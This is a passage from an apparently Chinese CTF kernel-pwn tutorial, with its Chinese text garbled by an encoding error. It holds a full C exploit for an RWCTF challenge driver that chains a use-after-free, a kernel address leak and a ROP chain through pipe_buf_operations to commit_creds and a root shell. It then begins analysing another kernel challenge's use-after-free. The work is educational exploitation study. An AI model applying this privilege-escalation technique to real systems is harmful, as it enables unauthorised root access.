<h3 id="â‘¢-FINAL-EXPLOIT-1"><a href="#â‘¢-FINAL-EXPLOIT-1" class="headerlink" title="â‘¢ FINAL EXPLOIT"></a>â‘¢ FINAL EXPLOIT</h3><p>æœ€åçš„ exp å¦‚ä¸‹ï¼Œè¿™ç§è§£æ³•<strong>ä¸éœ€è¦å‡ºé¢˜äººä¸»åŠ¨å…³é—­ä¸€äº›ä¿æŠ¤æ¥é™ä½é¢˜ç›®éš¾åº¦</strong>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/ldt.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-comment">/* kmalloc-192 has only 21 objects on a slub, we don&#x27;t need to spray to many */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEY_SPRAY_NUM 40</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_INODE_INFO_SZ 192</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_BUFFER_SZ 1024</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USER_FREE_PAYLOAD_RCU 0xffffffff813d8210</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff81096110</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff81095c30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81e00ed0</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET 0xffffffff81250c9d</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RBX_POP_RBP_POP_R12_RET 0xffffffff81250ca4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff8106ab4d</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> XCHG_RDI_RAX_DEC_STH_RET 0xffffffff81adfc70</span><br><br><span class="hljs-type">int</span> dev_fd;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> idx;<br>    <span class="hljs-type">uint32_t</span> size;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief allocate an object bby kmalloc(size, __GFP_ZERO | GFP_KERNEL )</span><br><span class="hljs-comment"> * __GFP_RECLAIM = __GFP_KSWAPD_RECLAIM | __GFP_DIRECT_RECLAIM </span><br><span class="hljs-comment"> * GFP_KERNEL = __GFP_RECLAIM | __GFP_IO | __GFP_FS</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * @param idx </span><br><span class="hljs-comment"> * @param size </span><br><span class="hljs-comment"> * @param buf </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">alloc</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> idx, <span class="hljs-type">uint32_t</span> size, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> <span class="hljs-title">n</span> =</span> &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br><br>    ioctl(dev_fd, <span class="hljs-number">0xDEADBEEF</span>, &amp;n);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> <span class="hljs-title">n</span> =</span> &#123;<br>        .idx = idx,<br>    &#125;;<br><br>    ioctl(dev_fd, <span class="hljs-number">0xC0DECAFE</span>, &amp;n);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> *buf, pipe_buffer_addr;<br>    <span class="hljs-type">int</span> key_id[KEY_SPRAY_NUM], victim_key_idx = <span class="hljs-number">-1</span>, pipe_key_id;<br>    <span class="hljs-type">char</span> desciption[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span> retval;<br><br>    <span class="hljs-comment">/* fundamental works */</span><br>    bindCore(<span class="hljs-number">0</span>);<br>    saveStatus();<br><br>    buf = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">0x4000</span>);<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/rwctf&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to open the /dev/rwctf file!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* construct UAF on user_key_payload */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct UAF obj and spray keys...&quot;</span>);<br>    alloc(<span class="hljs-number">0</span>, PIPE_INODE_INFO_SZ, buf);<br>    del(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; KEY_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-built_in">snprintf</span>(desciption, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;%s%d&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, i);<br>        key_id[i] = key_alloc(desciption, buf, PIPE_INODE_INFO_SZ - <span class="hljs-number">0x18</span>);<br>        <span class="hljs-keyword">if</span> (key_id[i] &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to alloc %d key!\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to add_key()!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    del(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* corrupt user_key_payload&#x27;s header */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] corrupting user_key_payload...&quot;</span>);<br><br>    buf[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    buf[<span class="hljs-number">2</span>] = <span class="hljs-number">0x2000</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (KEY_SPRAY_NUM * <span class="hljs-number">2</span>); i++) &#123;<br>        alloc(<span class="hljs-number">0</span>, PIPE_INODE_INFO_SZ, buf);<br>    &#125;<br><br>    <span class="hljs-comment">/* check for oob-read and leak kernel base */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] try to make an OOB-read...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; KEY_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (key_read(key_id[i], buf, <span class="hljs-number">0x4000</span>) &gt; PIPE_INODE_INFO_SZ) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] found victim key at idx: %d\n&quot;</span>, i);<br>            victim_key_idx = i;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            key_revoke(key_id[i]);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_key_idx == <span class="hljs-number">-1</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED at corrupt user_key_payload!&quot;</span>);<br>    &#125;<br><br>    kernel_offset = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x2000</span> / <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (buf[i] &gt; kernel_base &amp;&amp; (buf[i] &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x210</span>) &#123;<br>            kernel_offset = buf[i] - USER_FREE_PAYLOAD_RCU;<br>            kernel_base += kernel_offset;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (kernel_offset == <span class="hljs-number">-1</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to leak kernel addr!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Kernel offset: \033[0m0x%lx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel base: \033[0m0x%lx\n&quot;</span>, kernel_base);<br><br>    <span class="hljs-comment">/* construct UAF on pipe_inode_buffer to leak pipe_buffer&#x27;s addr */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct UAF on pipe_inode_info...&quot;</span>);<br><br>    <span class="hljs-comment">/* 0-&gt;1-&gt;..., the 1 will be the payload object */</span><br>    alloc(<span class="hljs-number">0</span>, PIPE_INODE_INFO_SZ, buf);<br>    alloc(<span class="hljs-number">1</span>, PIPE_INODE_INFO_SZ, buf);<br>    del(<span class="hljs-number">1</span>);<br>    del(<span class="hljs-number">0</span>);<br><br>    pipe_key_id = key_alloc(<span class="hljs-string">&quot;arttnba3pipe&quot;</span>, buf, PIPE_INODE_INFO_SZ - <span class="hljs-number">0x18</span>);<br>    del(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">/* this object is for the pipe buffer */</span><br>    alloc(<span class="hljs-number">0</span>, PIPE_BUFFER_SZ, buf);<br>    del(<span class="hljs-number">0</span>);<br><br>    pipe(pipe_fd);<br><br>    <span class="hljs-comment">/* note that the user_key_payload-&gt;datalen is 0xFFFF now */</span><br>    retval = key_read(pipe_key_id, buf, <span class="hljs-number">0xffff</span>);<br>    pipe_buffer_addr = buf[<span class="hljs-number">16</span>]; <span class="hljs-comment">/* pipe_inode_info-&gt;bufs */</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got pipe_buffer: \033[0m0x%lx\n&quot;</span>, <br>            pipe_buffer_addr);<br><br>    <span class="hljs-comment">/* construct fake pipe_buf_operations */</span><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    buf[<span class="hljs-number">0</span>] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    buf[<span class="hljs-number">1</span>] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    buf[<span class="hljs-number">2</span>] = pipe_buffer_addr + <span class="hljs-number">0x18</span>;  <span class="hljs-comment">/* pipe_buffer-&gt;ops */</span><br>    <span class="hljs-comment">/* after release(), we got back here */</span><br>    buf[<span class="hljs-number">3</span>] = kernel_offset + POP_RBX_POP_RBP_POP_R12_RET;<br>    <span class="hljs-comment">/* pipe_buf_operations-&gt;release */</span><br>    buf[<span class="hljs-number">4</span>] = kernel_offset + PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET;<br>    buf[<span class="hljs-number">5</span>] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    buf[<span class="hljs-number">6</span>] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    buf[<span class="hljs-number">7</span>] = kernel_offset + POP_RDI_RET;<br>    buf[<span class="hljs-number">8</span>] = <span class="hljs-literal">NULL</span>;<br>    buf[<span class="hljs-number">9</span>] = kernel_offset + PREPARE_KERNEL_CRED;<br>    buf[<span class="hljs-number">10</span>] = kernel_offset + XCHG_RDI_RAX_DEC_STH_RET;<br>    buf[<span class="hljs-number">11</span>] = kernel_offset + COMMIT_CREDS;<br>    buf[<span class="hljs-number">12</span>] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">0x31</span>;<br>    buf[<span class="hljs-number">13</span>] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    buf[<span class="hljs-number">14</span>] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    buf[<span class="hljs-number">15</span>] = getRootShell;<br>    buf[<span class="hljs-number">16</span>] = user_cs;<br>    buf[<span class="hljs-number">17</span>] = user_rflags;<br>    buf[<span class="hljs-number">18</span>] = user_sp + <span class="hljs-number">8</span>; <span class="hljs-comment">/* system() wants it : ( */</span><br>    buf[<span class="hljs-number">19</span>] = user_ss;<br><br>    del(<span class="hljs-number">0</span>);<br>    alloc(<span class="hljs-number">0</span>, PIPE_BUFFER_SZ, buf);<br><br>    <span class="hljs-comment">/* trigger pipe_buf_operations-&gt;release */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigerring pipe_buf_operations-&gt;release()...&quot;</span>);<br><br>    close(pipe_fd[<span class="hljs-number">1</span>]);<br>    close(pipe_fd[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ææƒï¼š</p>
<p><img src="https://s2.loli.net/2023/02/09/s56EOhQGcDKe2SN.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0x07-Kernel-Heap-Arbitrary-Address-Allocation"><a href="#0x07-Kernel-Heap-Arbitrary-Address-Allocation" class="headerlink" title="0x07. Kernel Heap - Arbitrary-Address Allocation"></a>0x07. Kernel Heap - Arbitrary-Address Allocation</h1><p>ä¸ç”¨æˆ·æ€ glibc ä¸­åˆ†é… fake chunk åè¦†å†™ <code>__free_hook</code> è¿™æ ·çš„æ‰‹æ³•ç±»ä¼¼ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥é€šè¿‡è¦†å†™ freelist ä¸­çš„ next æŒ‡é’ˆçš„æ–¹å¼å®Œæˆå†…æ ¸ç©ºé—´ä¸­ä»»æ„åœ°å€ä¸Šçš„å¯¹è±¡åˆ†é…ï¼Œå¹¶ä¿®æ”¹ä¸€äº›æœ‰ç”¨çš„æ•°æ®ä»¥å®Œæˆææƒ</p>
<h2 id="ä¾‹é¢˜ï¼šRWCTF2022é«˜æ ¡èµ›-Digging-into-kernel-1-amp-2"><a href="#ä¾‹é¢˜ï¼šRWCTF2022é«˜æ ¡èµ›-Digging-into-kernel-1-amp-2" class="headerlink" title="ä¾‹é¢˜ï¼šRWCTF2022é«˜æ ¡èµ› - Digging into kernel 1 &amp; 2"></a>ä¾‹é¢˜ï¼šRWCTF2022é«˜æ ¡èµ› - Digging into kernel 1 &amp; 2</h2><p><a href="/download/rwctf2022/kernel_for_player.tar.xz" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">é¢˜ç›®ä¸‹è½½ - kernel_for_player.tar.xz</a></p>
<blockquote>
<p>ä¸¤é“é¢˜ç›®å®é™…ä¸Šæ˜¯åŒä¸€é“é¢˜ï¼Œå› ä¸ºç¬¬ä¸€é¢˜ç”±äºå¯åŠ¨è„šæœ¬æ¼æ´æ‰€ä»¥å¯ä»¥ç›´æ¥æ‹¿ flagæ‰€ä»¥ç¬¬äºŒé“é¢˜å…¶å®æ˜¯å¯¹ç¬¬ä¸€é“é¢˜ç›®çš„è„šæœ¬çš„ä¿®å¤</p>
</blockquote>
<h3 id="â‘ -é¢˜ç›®åˆ†æ-2"><a href="#â‘ -é¢˜ç›®åˆ†æ-2" class="headerlink" title="â‘  é¢˜ç›®åˆ†æ"></a>â‘  é¢˜ç›®åˆ†æ</h3><p>é¦–å…ˆæŸ¥çœ‹å¯åŠ¨è„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-system-x86_64 \<br>    -kernel bzImage \<br>    -initrd rootfs.cpio \<br>    -append <span class="hljs-string">&quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet kalsr&quot;</span> \<br>    -cpu kvm64,+smep,+smap \<br>    -monitor null \<br>    --nographic<br></code></pre></td></tr></table></figure>

<p>å¼€å¯äº† smep å’Œ smapï¼Œè¿™é‡Œå‡ºé¢˜äººå°† kaslr å†™æˆäº† kalsrï¼Œä¸è¿‡å¹¶ä¸å½±å“ kaslr çš„é»˜è®¤å¼€å¯</p>
<p>æŸ¥çœ‹ <code>/sys/devices/system/cpu/vulnerabilities/*</code>ï¼Œå‘ç°å¼€å¯äº† KPTIï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">/home $ cat /sys/devices/system/cpu/vulnerabilities/*<br>Processor vulnerable<br>Mitigation: PTE Inversion<br>Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown<br>Mitigation: PTI<br>Vulnerable<br>Mitigation: usercopy/swapgs barriers and __user pointer sanitization<br>Mitigation: Full generic retpoline, STIBP: disabled, RSB filling<br>Not affected<br></code></pre></td></tr></table></figure>

<p>é¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ª <code>xkmod.ko</code> æ–‡ä»¶ï¼ŒæŒ‰ç…§æƒ¯ä¾‹è¿™åº”å½“å°±æ˜¯æœ‰æ¼æ´çš„ LKMï¼Œæ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>åœ¨æ¨¡å—è½½å…¥æ—¶ä¼šæ–°å»ºä¸€ä¸ª kmem_cache å« <code>&quot;lalala&quot;</code>ï¼Œå¯¹åº” object å¤§å°æ˜¯ 192ï¼Œè¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ°åé¢ä¸‰ä¸ªå‚æ•°éƒ½æ˜¯ 0 ï¼Œå¯¹åº”çš„æ˜¯ alignï¼ˆå¯¹é½ï¼‰ã€flagsï¼ˆæ ‡å¿—ä½ï¼‰ã€ctorï¼ˆæ„é€ å‡½æ•°ï¼‰ï¼Œç”±äºæ²¡æœ‰è®¾ç½® <code>SLAB_ACCOUNT</code> æ ‡å¿—ä½æ•…è¯¥ <code>kmem_cache</code> <strong>ä¼šé»˜è®¤ä¸ kmalloc-192 åˆå¹¶</strong></p>
<p><img src="https://s2.loli.net/2022/01/25/5NIvpKwQbHFditC.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å®šä¹‰äº†ä¸€ä¸ªå¸¸è§„çš„èœå•å †ï¼Œç»™äº†åˆ†é…ã€ç¼–è¾‘ã€è¯»å– object çš„åŠŸèƒ½ï¼Œè¿™é‡Œçš„ buf æ˜¯ä¸€ä¸ªå…¨å±€æŒ‡é’ˆï¼Œæˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ° ioctl ä¸­æ‰€æœ‰çš„æ“ä½œ<strong>éƒ½æ²¡æœ‰ä¸Šé”</strong></p>
<p><img src="https://s2.loli.net/2022/01/27/589pIGzWNVQKsiA.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æˆ‘ä»¬åº”å½“ä¼ å…¥å¦‚ä¸‹ç»“æ„ä½“ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Data</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> *ptr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> length;<br>&#125;data;<br></code></pre></td></tr></table></figure>

<p>è¿˜å®šä¹‰äº†ä¸€ä¸ª <code>copy_overflow()</code> å‡½æ•°ï¼Œä¸è¿‡ç¬”è€…æš‚æ—¶æ²¡æœ‰å‘ç°åœ¨å“ªé‡Œæœ‰ç”¨åˆ°è¿™ä¸ªå‡½æ•°</p>
<p><img src="https://s2.loli.net/2022/02/22/5hQp9OUlkwYNq2g.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ¼æ´ç‚¹ä¸»è¦åœ¨å…³é—­è®¾å¤‡æ–‡ä»¶æ—¶ä¼šé‡Šæ”¾æ‰ bufï¼Œä½†æ˜¯æ²¡æœ‰å°† buf æŒ‡é’ˆç½® NULLï¼Œ<strong>åªè¦æˆ‘ä»¬åŒæ—¶æ‰“å¼€å¤šä¸ªè®¾å¤‡æ–‡ä»¶ä¾¿èƒ½å®Œæˆ UAF</strong></p>
<p><img src="https://s2.loli.net/2022/02/22/l9RL5JDtWo6Febs.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>åŸºæœ¬ä¸Šç­‰äºå¤åˆ» CISCN-2017 çš„ babydrive</p>
<blockquote>
<p>æŸ Pwn ç¥æœ‰è¨€ï¼š</p>
<p><img src="https://s2.loli.net/2023/02/07/6CZayv1J2oDqBO7.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
</blockquote>
</blockquote>
<h3 id="â‘¡-æ¼æ´åˆ©ç”¨-2"><a href="#â‘¡-æ¼æ´åˆ©ç”¨-2" class="headerlink" title="â‘¡ æ¼æ´åˆ©ç”¨"></a>â‘¡ æ¼æ´åˆ©ç”¨</h3><p>æˆ‘ä»¬æœ‰ç€ä¸€ä¸ªåŠŸèƒ½å…¨é¢çš„â€œå †é¢æ¿â€ï¼Œè¿˜æ‹¥æœ‰ç€è¿‘ä¹å¯ä»¥æ— é™æ¬¡åˆ©ç”¨çš„ UAFï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥åœ¨å†…æ ¸ç©ºé—´ä¸­ä¸ºæ‰€æ¬²ä¸ºäº†ï¼ˆç”šè‡³ä¸éœ€è¦ä½¿ç”¨ ioctl æœªä¸Šé”çš„æ¼æ´ï¼‰ï¼Œå› æ­¤è§£æ³•ä¹Ÿæ˜¯å¤šç§å¤šæ ·çš„</p>
